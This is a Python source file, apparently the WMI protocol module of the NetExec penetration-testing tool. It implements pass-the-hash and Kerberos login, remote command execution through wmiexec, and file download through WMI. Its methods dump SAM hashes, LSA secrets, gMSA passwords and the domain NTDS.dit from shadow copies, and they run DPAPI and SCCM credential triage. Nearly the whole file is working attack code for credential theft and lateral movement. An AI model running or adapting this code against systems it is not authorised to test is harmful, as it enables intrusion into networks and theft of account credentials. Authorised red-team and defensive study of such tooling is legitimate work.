import os
import re
import struct
import binascii
from Cryptodome.Hash import MD4
from io import StringIO
import base64

from nxc.helpers.negotiate_parser import parse_challenge
from nxc.helpers.misc import sanitize_dns
from nxc.config import process_secret
from nxc.connection import connection, requires_admin
from nxc.helpers.rpc import dcom_FirewallChecker
from nxc.helpers.misc import validate_ntlm
from nxc.logger import NXCAdapter
from nxc.helpers.logger import highlight
from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from nxc.protocols.wmi import wmiexec, wmiexec_event
from nxc.protocols.wmi.remoteops import RemoteOperations
from nxc.helpers.dpapi import DPAPITriage

from dploot.lib.network.wmi import WMITarget as Target

from impacket import ntlm
from impacket.uuid import uuidtup_to_bin
from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import Principal
from impacket.examples.secretsdump import LSASecrets, SAMHashes, NTDSHashes
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, MSRPC_BIND, MSRPCBind, CtxItem, MSRPCHeader, SEC_TRAILER, MSRPCBindAck
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, IWbemLevel1Login, DCERPCSessionError, IWbemServices

MSRPC_UUID_PORTMAP = uuidtup_to_bin(("E1AF8308-5D1F-11C9-91A4-08002B14A0FA", "3.0"))


class wmi(connection):
    def __init__(self, args, db, host):
        self.domain = ""
        self.targetDomain = ""
        self.hash = ""
        self.lmhash = ""
        self.nthash = ""
        self.server_os = None
        self.doKerberos = False
        self.tgt = None
        self.stringBinding = None
        # from: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/18d8fbe8-a967-4f1c-ae50-99ca8e491d2d
        self.rpc_error_status = {
            "0000052F": "STATUS_ACCOUNT_RESTRICTION",
            "00000533": "STATUS_ACCOUNT_DISABLED",
            "00000775": "STATUS_ACCOUNT_LOCKED_OUT",
            "00000701": "STATUS_ACCOUNT_EXPIRED",
            "00000532": "STATUS_PASSWORD_EXPIRED",
            "00000530": "STATUS_INVALID_LOGON_HOURS",
            "00000531": "STATUS_INVALID_WORKSTATION",
            "00000569": "STATUS_LOGON_TYPE_NOT_GRANTED",
            "00000773": "STATUS_PASSWORD_MUST_CHANGE",
            "00000005": "STATUS_ACCESS_DENIED",
            "0000052E": "STATUS_LOGON_FAILURE",
            "0000052B": "STATUS_WRONG_PASSWORD",
            "00000721": "RPC_S_SEC_PKG_ERROR"
        }
        self.iWbemLevel1Login = None
        self.dcom_conn = None
        self.namespaces = {}
        self._remote_ops = None
        self.no_da = None
        self.dpapi_system_key = None

        self._dpapi_triage = None

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "WMI",
                "host": self.host,
                "port": self.port,
                "hostname": self.hostname
            }
        )

    # Redefine disconnect function.
    def disconnect(self):
        if self.conn:
            self.conn.disconnect()
        if self.dcom_conn:
            self.dcom_conn.disconnect()
        return

    def create_conn_obj(self):
        connection_target = fr"ncacn_ip_tcp:{self.remoteName}[{self.port!s}]"
        self.logger.debug(f"Creating WMI connection object to {connection_target}")
        try:
            rpctansport = transport.DCERPCTransportFactory(connection_target)
            rpctansport.set_credentials(username="", password="", domain="", lmhash="", nthash="", aesKey="")
            rpctansport.setRemoteHost(self.host)
            rpctansport.set_connect_timeout(self.args.rpc_timeout)
            dce = rpctansport.get_dce_rpc()
            dce.set_auth_type(RPC_C_AUTHN_WINNT)
            dce.connect()
            dce.bind(MSRPC_UUID_PORTMAP)
            dce.disconnect()
        except Exception as e:
            self.logger.debug(f"Received error creating WMI connection object: {e}")
            return False
        else:
            self.logger.debug(f"Successfully created WMI connection object to {connection_target}")
            self.conn = rpctansport
            return True

    def enum_host_info(self):
        # All code pick from DumpNTLNInfo.py
        # https://github.com/fortra/impacket/blob/master/examples/DumpNTLMInfo.py

        bind = MSRPCBind()
        item = CtxItem()
        item["AbstractSyntax"] = epm.MSRPC_UUID_PORTMAP
        item["TransferSyntax"] = uuidtup_to_bin(("8a885d04-1ceb-11c9-9fe8-08002b104860", "2.0"))
        item["ContextID"] = 0
        item["TransItems"] = 1
        bind.addCtxItem(item)

        packet = MSRPCHeader()
        packet["type"] = MSRPC_BIND
        packet["pduData"] = bind.getData()
        packet["call_id"] = 1

        auth = ntlm.getNTLMSSPType1("", "", signingRequired=True, use_ntlmv2=True)
        sec_trailer = SEC_TRAILER()
        sec_trailer["auth_type"] = RPC_C_AUTHN_WINNT
        sec_trailer["auth_level"] = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
        sec_trailer["auth_ctx_id"] = 0 + 79231
        pad = (4 - (len(packet.get_packet()) % 4)) % 4
        if pad != 0:
            packet["pduData"] += b"\xFF" * pad
            sec_trailer["auth_pad_len"] = pad
        packet["sec_trailer"] = sec_trailer
        packet["auth_data"] = auth

        try:
            self.conn.connect()
            self.conn.send(packet.get_packet())
            buffer = self.conn.recv()
        except Exception:
            buffer = 0

        self.remoteName = self.host
        if buffer != 0:
            response = MSRPCHeader(buffer)
            bindResp = MSRPCBindAck(response.getData())
            ntlm_info = parse_challenge(bindResp["auth_data"])
            dns_hostname = ntlm_info["dns_hostname"] or ""
            hostname = ntlm_info["hostname"] or dns_hostname.split(".", 1)[0] or self.host
            domain = ntlm_info["domain"] or (dns_hostname.split(".", 1)[1] if "." in dns_hostname else self.host)
            self.hostname = sanitize_dns(hostname, self.logger)
            self.targetDomain = self.domain = sanitize_dns(domain, self.logger)
            self.remoteName = sanitize_dns(dns_hostname, self.logger) if self.kerberos else self.host
            self.server_os = ntlm_info["os_version"]
            self.logger.extra["hostname"] = self.hostname
        else:
            self.hostname = self.host
        if self.args.local_auth:
            self.domain = self.hostname
        if self.args.domain:
            self.domain = self.args.domain

        if not self.kdcHost and self.domain:
            result = self.resolver(self.domain)
            self.kdcHost = result["host"] if result else None
            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")

    def print_host_info(self):
        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.targetDomain})")

    def check_if_admin(self):
        # With several credentials, drop the admin flag, namespaces and DCOM connections (cached per target by impacket) of the previous one
        self.admin_privs = False
        self.namespaces = {}
        if self.dcom_conn:
            self.dcom_conn.disconnect()
            self.dcom_conn = None
        try:
            # Only keep the connection once activated: impacket's disconnect() can't run twice on a target
            dcom_conn = DCOMConnection(self.remoteName, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True, doKerberos=self.doKerberos, kdcHost=self.kdcHost, aesKey=self.aesKey, remoteHost=self.host, TGT=self.tgt)
            iInterface = dcom_conn.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
            self.dcom_conn = dcom_conn
            flag, self.stringBinding = dcom_FirewallChecker(iInterface, self.host, self.args.rpc_timeout, self.logger)
        except Exception as e:
            self.logger.debug(f"Received error while checking admin: {e}")
            if "access_denied" not in str(e).lower():
                self.logger.fail(str(e))
        else:
            if not flag or not self.stringBinding:
                error_msg = f'Check admin error: dcom initialization failed with stringbinding: "{self.stringBinding}", please try "--rpc-timeout" option. (probably is admin)'

                if not self.stringBinding:
                    error_msg = "Check admin error: dcom initialization failed: can't get target stringbinding, maybe cause by IPv6 or any other issues, please check your target again"

                self.logger.fail(error_msg) if not flag else self.logger.debug(error_msg)
            else:
                try:
                    self.iWbemLevel1Login = IWbemLevel1Login(iInterface)
                    self.get_namespace("//./root/cimv2")
                except Exception as e:
                    if "access_denied" not in str(e).lower():
                        self.logger.fail(str(e))
                        return False
                else:
                    self.admin_privs = True

    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
        self.logger.debug("Starting WMI login with Kerberos")
        lmhash = ""
        nthash = ""
        self.password = password
        self.username = username
        self.domain = domain
        self.tgt = None
        self.create_conn_obj()

        if password == "":
            if ntlm_hash.find(":") != -1:
                lmhash, nthash = ntlm_hash.split(":")
            else:
                nthash = ntlm_hash
            self.nthash = nthash
            self.lmhash = lmhash

        kerb_pass = next(s for s in [nthash, password, aesKey] if s) if not all(s == "" for s in [nthash, password, aesKey]) else ""

        if useCache and kerb_pass == "":
            ccache = CCache.loadFile(os.getenv("KRB5CCNAME"))
            self.logger.debug(f"Using ccache from {ccache}")
            username = ccache.credentials[0].header["client"].prettyPrint().decode().split("@")[0]
            self.username = username
        used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"

        try:
            self.logger.debug(f"Attempting to connect via WMI to {self.host}")
            dce = self.conn.get_dce_rpc()
            # Reuse one TGT for every RPC/DCOM bind, impacket would otherwise redo the AS exchange on each bind
            if not useCache and kerb_pass:
                tgt, cipher, _, session_key = getKerberosTGT(Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value), password, domain, lmhash, nthash, self.aesKey, kdcHost)
                self.tgt = {"KDC_REP": tgt, "cipher": cipher, "sessionKey": session_key}
            self.conn.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, aesKey=self.aesKey, TGT=self.tgt)
            self.conn.setRemoteHost(self.host)
            self.conn.set_kerberos(True, kdcHost)
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(MSRPC_UUID_PORTMAP)
        except Exception as e:
            dce.disconnect()
            error_msg = str(e).lower()
            self.logger.debug(f"WMI errored while connecting: {error_msg}")
            if "unpack requires a buffer of 4 bytes" in error_msg:
                error_msg = "Kerberos authentication failure"
                out = f"{self.domain}\\{self.username}{used_ccache} {error_msg}"
                self.logger.fail(out)
            elif "kerberos sessionerror" in error_msg:
                out = f"{self.domain}\\{self.username}{used_ccache} {next(iter(e.getErrorString()))}"
                self.logger.fail(out, color="magenta")
            else:
                out = f"{self.domain}\\{self.username}{used_ccache} {e!s}"
                self.logger.fail(out, color="red")
                return False
        else:
            try:
                self.logger.debug("Got valid creds, trying to get data from RPC connection")
                entry_handle = epm.ept_lookup_handle_t()
                request = epm.ept_lookup()
                request["inquiry_type"] = 0x0
                request["object"] = NULL
                request["Ifid"] = NULL
                request["vers_option"] = 0x1
                request["entry_handle"] = entry_handle
                request["max_ents"] = 1
                dce.request(request)
            except Exception as e:
                dce.disconnect()
                error_msg = str(e).lower()
                self.logger.debug(error_msg)
                for code in self.rpc_error_status:
                    if code in error_msg:
                        error_msg = self.rpc_error_status[code]
                out = f"{self.domain}\\{self.username}{used_ccache} {error_msg.upper()}"
                self.logger.fail(out, color=("red" if "access_denied" in error_msg else "magenta"))
                return False
            else:
                self.doKerberos = True
                self.check_if_admin()
                out = f"{self.domain}\\{self.username}{used_ccache} {self.mark_pwned()}"
                self.logger.success(out)
                dce.disconnect()
                return True

    def plaintext_login(self, domain, username, password):
        self.password = password
        self.username = username
        self.domain = domain
        try:
            self.conn.set_credentials(username=self.username, password=self.password, domain=self.domain, lmhash=self.lmhash, nthash=self.nthash)
            dce = self.conn.get_dce_rpc()
            dce.set_auth_type(RPC_C_AUTHN_WINNT)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(MSRPC_UUID_PORTMAP)
        except Exception as e:
            dce.disconnect()
            self.logger.debug(str(e))
            out = f"{self.domain}\\{self.username}:{process_secret(self.password)} {e!s}"
            self.logger.fail(out, color="red")
        else:
            try:
                # Get data from rpc connection if got vaild creds
                entry_handle = epm.ept_lookup_handle_t()
                request = epm.ept_lookup()
                request["inquiry_type"] = 0x0
                request["object"] = NULL
                request["Ifid"] = NULL
                request["vers_option"] = 0x1
                request["entry_handle"] = entry_handle
                request["max_ents"] = 1
                dce.request(request)
            except Exception as e:
                dce.disconnect()
                error_msg = str(e).lower()
                self.logger.debug(error_msg)
                for code in self.rpc_error_status:
                    if code in error_msg:
                        error_msg = self.rpc_error_status[code]
                self.logger.fail((f"{self.domain}\\{self.username}:{process_secret(self.password)} ({error_msg.upper()})"), color=("red" if "access_denied" in error_msg else "magenta"))
                return False
            else:
                self.check_if_admin()
                dce.disconnect()
                out = f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}"
                if self.username == "" and self.password == "":
                    out += "(Default allow anonymous login)"
                self.logger.success(out)
                return True

    def hash_login(self, domain, username, ntlm_hash):
        self.username = username
        lmhash = ""
        nthash = ""
        if ntlm_hash.find(":") != -1:
            self.lmhash, self.nthash = ntlm_hash.split(":")
        else:
            lmhash = ""
            nthash = ntlm_hash

        self.nthash = nthash
        self.lmhash = lmhash

        try:
            self.conn.set_credentials(username=self.username, password=self.password, domain=self.domain, lmhash=lmhash, nthash=nthash)
            dce = self.conn.get_dce_rpc()
            dce.set_auth_type(RPC_C_AUTHN_WINNT)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(MSRPC_UUID_PORTMAP)
        except Exception as e:
            dce.disconnect()
            self.logger.debug(str(e))
            out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {e!s}"
            self.logger.fail(out, color="red")
        else:
            try:
                # Get data from rpc connection if got vaild creds
                entry_handle = epm.ept_lookup_handle_t()
                request = epm.ept_lookup()
                request["inquiry_type"] = 0x0
                request["object"] = NULL
                request["Ifid"] = NULL
                request["vers_option"] = 0x1
                request["entry_handle"] = entry_handle
                request["max_ents"] = 1
                dce.request(request)
            except Exception as e:
                dce.disconnect()
                error_msg = str(e).lower()
                self.logger.debug(error_msg)
                for code in self.rpc_error_status:
                    if code in error_msg:
                        error_msg = self.rpc_error_status[code]
                self.logger.fail((f"{self.domain}\\{self.username}:{process_secret(self.nthash)} ({error_msg.upper()})"), color=("red" if "access_denied" in error_msg else "magenta"))
                return False
            else:
                self.check_if_admin()
                dce.disconnect()
                out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
                if self.username == "" and self.password == "":
                    out += "(Default allow anonymous login)"
                self.logger.success(out)
                return True

    def read_file(self, remote_path) -> bytes | None:
        self.logger.debug(f"Try reading file {remote_path}")
        escaped_path = remote_path.replace("\\", "\\\\")

        # Load the Namespace
        try:
            powershellv3_namespace = self.get_namespace("//./root/Microsoft/Windows/Powershellv3")
        except Exception as e:
            self.logger.debug(f"Cannot load WMI Namespace //./root/Microsoft/Windows/Powershellv3: {e}")
            return None

        # Read the file
        try:
            object_path = f'PS_ModuleFile.InstanceID="{escaped_path}"'
            iWbemClassObject, _ = powershellv3_namespace.GetObject(object_path)
            obj = iWbemClassObject.getProperties()

            file_data = None
            for prop_name, prop_value in obj.items():
                if prop_name == "FileData":
                    file_data = prop_value["value"]
                    break

            if len(file_data) < 4:
                return None

            # Unpack it
            file_length = struct.unpack(">I", bytes(file_data[:4]))[0]
            return bytes(file_data[4:4 + file_length])
        except DCERPCSessionError as e:
            if e.error_code == 0x80041006:  # WBEM_E_OUT_OF_MEMORY
                # With the PS_ModuelFile technique, the file will be loaded into
                # WMI process memory. By default, a specific memory space is allocated
                # to each WMI provider host process (WMIPrvse.exe). This value can be
                # found by querying MemoryPerHost in __ProviderHostQuotaConfiguration class
                # in root namespace. Default is 512MB, but tests showed that starting from 70MB, the download can fail
                # File is too big, let's try to copy it the dirty way

                live_path = re.sub(
                    r"^\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy\d+",
                    "C:",
                    escaped_path,
                    flags=re.IGNORECASE,
                )

                # Check file size
                def callback_func(iEnumWbemClassObject, records):
                    wmi_results = iEnumWbemClassObject.Next(0xFFFFFFFF, 1)[0]
                    record = dict(wmi_results.getProperties())
                    callback_func.size = record["FileSize"]["value"]

                callback_func.size = 0

                wql = f"SELECT FileSize FROM CIM_DataFile WHERE Name = '{live_path}'"
                self.wmi_query(wql=wql, namespace="//./root/cimv2", callback_func=callback_func)

                # Get the file chunk by chunk with command exec
                self.logger.fail(f"{remote_path} filesize is {callback_func.size / 1024**2:.0f}MB. The download might take a LOT of time and use wmi command execution.")
                data = b""
                chunk_size = 1 * 1024 * 1024  # 1MB - Could not do bigger or it can crash
                chunk_count = (callback_func.size + chunk_size - 1) // chunk_size
                try:
                    for i in range(chunk_count):
                        offset = i * chunk_size
                        self.logger.debug(f"Reading bytes from {offset} to {offset + chunk_size if offset + chunk_size < callback_func.size else callback_func.size}")
                        powershell_command = f"$fs=[IO.File]::OpenRead('{remote_path}');try {{ $fs.Seek({offset},[IO.SeekOrigin]::Begin)|Out-Null;$b=[byte[]]::new({chunk_size});$n=$fs.Read($b,0,$b.Length);Write-Output ([Convert]::ToBase64String($b,0,$n)) }} finally {{ $fs.Dispose() }}"
                        output = self.execute_psh(powershell_command, get_output=True)
                        data += base64.b64decode(output)
                    return data
                except Exception as e2:
                    self.logger.debug(f"Error while downloading {remote_path}: {e2}")
                    self.logger.fail(f"Could not download {remote_path}")

            elif e.error_code == 0x80041002:  # WBEM_E_NOT_FOUND
                self.logger.fail(f"Cannot find file '{remote_path}'")
            else:
                self.logger.debug(f"Error while downloading {remote_path}: {e}")
        return None

    def get_file_single(self, remote_path, download_path):
        if self.args.append_host:
            download_path = f"{self.hostname}-{remote_path}"

        file_data = self.read_file(remote_path)
        if file_data is None:
            return False
        else:
            with open(download_path, "wb+") as file:
                file.write(file_data)
            return True

    @requires_admin
    def get_file(self):
        for src, dest in self.args.get_file:
            self.logger.display(f'Copying "{src}" to "{dest}"')
            if self.get_file_single(src, dest):
                self.logger.success(f'File "{src}" was downloaded to "{dest}"')
            else:
                self.logger.fail(f'Could not get file "{src}"')

    @requires_admin
    def sam(self):
        def add_sam_hash(sam_hash):
            self.logger.highlight(sam_hash)
            if "_history" in sam_hash:
                return
            username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
            # TODO: Implement wmi creds database
            add_sam_hash.sam_hashes += 1

        add_sam_hash.sam_hashes = 0

        output_filename = self.output_file_template.format(output_folder="sam")

        bootkey = self.remote_ops.get_bootkey(output_filename)
        if bootkey is None:
            return

        # Get the SAM hive
        sam_hive_path = f"{self.remote_ops.shadow_copy_path}\\Windows\\System32\\config\\SAM"
        if not self.get_file_single(sam_hive_path, f"{output_filename}.sam"):
            self.logger.fail("Could not get SAM hive")
            return

        SAM = SAMHashes(
                f"{output_filename}.sam",
                bootkey,
                isRemote=None,
                history=self.args.history,
                perSecretCallback=lambda secret: add_sam_hash(secret),
            )
        self.logger.display("Dumping SAM hashes")
        SAM.dump()
        SAM.export(output_filename)
        self.logger.success(f"Dumped {highlight(add_sam_hash.sam_hashes)} SAM hashes to {output_filename + '.sam'}")

    @requires_admin
    def lsa(self, quiet=False):
        def add_lsa_secret(secret):
            add_lsa_secret.secrets += 1
            if "dpapi_machinekey" not in secret:
                if not quiet:
                    self.logger.highlight(secret)
            else:
                correl_table = {"dpapi_machinekey": "MachineKey", "dpapi_userkey": "UserKey"}
                self.dpapi_system_key = {correl_table[k]: binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
                if not quiet:
                    self.logger.highlight(f"dpapi_machinekey:{self.dpapi_system_key['MachineKey'].hex()}")
                    self.logger.highlight(f"dpapi_userkey:{self.dpapi_system_key['UserKey'].hex()}")
            if "_SC_GMSA_{84A78B8C" in secret:
                gmsa_id = secret.split("_")[4].split(":")[0]
                data = bytes.fromhex(secret.split("_")[4].split(":")[1])
                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(data)
                currentPassword = blob["CurrentPassword"][:-2]
                ntlm_hash = MD4.new()
                ntlm_hash.update(currentPassword)
                passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
                if not quiet:
                    self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")

        add_lsa_secret.secrets = 0

        output_filename = self.output_file_template.format(output_folder="lsa")

        bootkey = self.remote_ops.get_bootkey(output_filename)
        if bootkey is None:
            return

        # Get the LSA hive
        lsa_hive_path = f"{self.remote_ops.shadow_copy_path}\\Windows\\System32\\config\\SECURITY"
        if not self.get_file_single(lsa_hive_path, f"{output_filename}.security"):
            self.logger.fail("Could not get LSA hive")
            return

        LSA = LSASecrets(
            f"{output_filename}.security",
            bootkey,
            None,
            isRemote=None,
            perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
        )
        if not quiet:
            self.logger.display("Dumping LSA secrets")
        LSA.dumpCachedHashes()
        LSA.exportCached(output_filename)
        LSA.dumpSecrets()
        LSA.exportSecrets(output_filename)
        if not quiet:
            self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {output_filename + '.secrets'} and {output_filename + '.cached'}")

    @requires_admin
    def ntds(self):
        printed_kerb_keys_banner = False

        def add_hash(secret_type, secret):
            nonlocal printed_kerb_keys_banner
            if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
                self.logger.display("Kerberos keys:")
                printed_kerb_keys_banner = True

            # Count the type of secrets
            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
                add_hash.kerb_secrets += 1
            else:
                add_hash.nt_lm_secrets += 1

            # Log the secret based on args
            if self.args.enabled:
                if "Enabled" in secret:
                    secret = " ".join(secret.split(" ")[:-1])
                    self.logger.highlight(secret)
            else:
                secret = " ".join(secret.split(" ")[:-1]) if " " in secret else secret
                self.logger.highlight(secret)

            # Filter out computer accounts, history hashes and kerberos keys for adding to db
            if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
                if secret.find("\\") != -1:
                    _, clean_hash = secret.split("\\")
                else:
                    clean_hash = secret

                try:
                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
                    parsed_hash = f"{lmhash}:{nthash}"
                    if validate_ntlm(parsed_hash):
                        add_hash.added_to_db += 1
                        return
                    raise
                except Exception:
                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
            else:
                self.logger.debug("Dumped hash is a computer account, not adding to db")

        add_hash.nt_lm_secrets = 0
        add_hash.kerb_secrets = 0
        add_hash.added_to_db = 0

        output_filename = self.output_file_template.format(output_folder="ntds")

        bootkey = self.remote_ops.get_bootkey(output_filename)
        if bootkey is None:
            return

        # Get the NTDS.dit file
        ntds_file = f"{self.remote_ops.shadow_copy_path}\\Windows\\NTDS\\ntds.dit"
        if not self.get_file_single(ntds_file, f"{output_filename}.ntds.dit"):
            self.logger.fail("Could not download NTDS.dit file")
            return

        NTDS = NTDSHashes(
            f"{output_filename}.ntds.dit",
            self.remote_ops.bootkey,
            isRemote=False,
            history=self.args.history,
            noLMHash=True,
            justNTLM=not self.args.kerberos_keys,
            useVSSMethod=True,
            remoteOps=None,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=f"{output_filename}.ntds",
            justUser=self.args.userntds if self.args.userntds else None,
            printUserStatus=True,
            perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret),
        )

        try:
            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
            NTDS.dump()
            ntds_outfile = f"{output_filename}.ntds"
            self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile}")
            if self.args.kerberos_keys:
                self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
            self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
        except Exception as e:
            self.logger.fail(e)

    @requires_admin
    def wmi_query(self, wql=None, namespace=None, callback_func=None):
        records = []
        if not wql:
            wql = self.args.wmi_query.strip("\n")

        if not namespace:
            namespace = self.args.wmi_namespace

        try:
            iWbemServices = self.get_namespace(namespace)
            iEnumWbemClassObject = iWbemServices.ExecQuery(wql)
        except Exception as e:
            self.logger.debug(str(e))
            self.logger.fail(f"Execute WQL error: {e}")
            return False
        else:
            self.logger.info(f"Executing WQL syntax: {wql}")
            try:
                if not callback_func:
                    while True:
                        wmi_results = iEnumWbemClassObject.Next(0xFFFFFFFF, 1)[0]
                        record = wmi_results.getProperties()
                        records.append(record)
                        for k, v in record.items():
                            self.logger.highlight(f"{k} => {v['value']}")
                else:
                    callback_func(iEnumWbemClassObject, records)
            except Exception as e:
                if str(e).find("S_FALSE") < 0:
                    self.logger.debug(e)
            return records

    def list_snapshots(self):
        drive = self.args.list_snapshots
        self.logger.info(f"Retrieving volume shadow copies of drive {drive}.")
        wql = "select ID, DeviceObject, ClientAccessible, InstallDate from win32_shadowcopy"

        def callback_func(iEnumWbemClassObject, records):
            while True:
                wmi_results = iEnumWbemClassObject.Next(0xFFFFFFFF, 1)[0]
                record = dict(wmi_results.getProperties())
                records.append(record)

        snapshots = self.wmi_query(wql=wql, namespace="//./root/cimv2", callback_func=callback_func)
        if not snapshots:
            self.logger.info("No volume shadow copies found.")
            return

        self.logger.highlight(f"{'Drive':<8}{'Shadow Copy ID':<40}{'ClientAccessible':<18}{'InstallDate':<27}{'Device Object':<50}")
        self.logger.highlight(f"{'------':<8}{'--------------':<40}{'----------------':<18}{'-----------':<27}{'-------------':<50}")
        for record in snapshots:
            self.logger.highlight(f"{drive:<8}{record['ID']['value']:<40}{record['ClientAccessible']['value']:<18}{record['InstallDate']['value']:<27}{record['DeviceObject']['value']:<50}")

    @requires_admin
    def execute(self, command=None, get_output=False, use_powershell=False):
        output = ""

        # Execution via -x
        if not command and self.args.execute:
            command = self.args.execute
            if not self.args.no_output:
                get_output = True

        if "systeminfo" in command and self.args.exec_timeout < 10:
            self.logger.fail("Execute 'systeminfo' must set the interval time higher than 10 seconds")
            return ""

        if self.server_os is not None and "NT 5" in self.server_os:
            self.logger.fail("Execute command failed, not support current server os (version < NT 6)")
            return ""

        if self.args.exec_method == "wmiexec":
            exec_method = wmiexec.WMIEXEC(
                self.remoteName,
                self.iWbemLevel1Login,
                self.logger,
                self.args.exec_timeout,
                self.args.codec,
                self.get_namespace("//./root/cimv2")
            )
        elif self.args.exec_method == "wmiexec-event":
            exec_method = wmiexec_event.WMIEXEC_EVENT(
                self.remoteName,
                self.iWbemLevel1Login,
                self.logger,
                self.args.exec_timeout,
                self.args.codec,
                self.get_namespace("//./root/subscription")
            )
        output = exec_method.execute(command, get_output, use_powershell=use_powershell)

        if self.args.execute and get_output:
            self.logger.success(f'Executed command: "{command}" via {self.args.exec_method}')
            buf = StringIO(output).readlines()
            for line in buf:
                if line.strip():
                    self.logger.highlight(line.strip())
            return output
        else:
            return output

    def execute_psh(self, command=None, get_output=False):
        # Execution via -X
        if not command and self.args.execute_psh:
            command = self.args.execute_psh
            if not self.args.no_output:
                get_output = True

        output = self.execute(command, get_output, use_powershell=True)

        if self.args.execute_psh and get_output:
            self.logger.success(f'Executed PowerShell command: "{command}" via {self.args.exec_method}')
            buf = StringIO(output).readlines()
            for line in buf:
                if line.strip():
                    self.logger.highlight(line.strip())
            return output
        else:
            return output

    def get_namespace(self, namespace: str) -> IWbemServices:
        """Load WMI namespaces and place them in cache. If a namespace is already loaded in cache, return the namespace in cache"""
        if namespace in self.namespaces:
            return self.namespaces[namespace]
        self.logger.debug(f"Getting namespace {namespace}")
        self.namespaces[namespace] = self.iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
        self.iWbemLevel1Login.RemRelease()
        return self.namespaces[namespace]

    @property
    def remote_ops(self):
        if self._remote_ops is None:
            self._remote_ops = RemoteOperations(self, shadow_id=self.args.shadow_id)
        return self._remote_ops

    @requires_admin
    def sccm(self):
        self.dpapi_triage.triage_sccm()

    @requires_admin
    def dpapi(self):
        self.dpapi_triage.triage_dpapi()

    @property
    def dpapi_triage(self) -> DPAPITriage:
        if self._dpapi_triage is not None:
            return self._dpapi_triage
        target = Target.create(
            domain=self.domain,
            username=self.username,
            password=self.password,
            address=self.remoteName,
            lmhash=self.lmhash,
            nthash=self.nthash,
            do_kerberos=self.kerberos,
            aesKey=self.aesKey,
            use_kcache=self.use_kcache,
        )

        self._dpapi_triage = DPAPITriage(self, target)
        return self._dpapi_triage
